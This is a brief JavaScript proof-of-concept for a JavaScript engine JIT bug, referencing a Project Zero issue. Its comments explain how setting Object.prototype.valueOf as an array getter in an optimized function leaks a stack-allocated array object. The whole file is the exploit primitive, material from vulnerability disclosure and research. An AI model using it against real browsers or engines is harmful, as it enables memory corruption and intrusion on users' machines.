function opt() {
    let arr = [];
    return arr['x'];
}

function main() {
    let arr = [1.1, 2.2, 3.3];
    for (let i = 0; i < 0x10000; i++) {
        opt();
    }

    Array.prototype.__defineGetter__('x', Object.prototype.valueOf);

    print(opt());
}

main();

//However, if the function has no side effect, the function gets 
//called regardless of the flag. One such function that is marked as 
//HasNoSideEffect, but we can abuse is the Object.prototype.valueOf method. 
//This method returns "this" itself. So if we use this method as the getter, 
//it will return the array object allocated in the stack.

//https://bugs.chromium.org/p/project-zero/issues/detail?id=1437

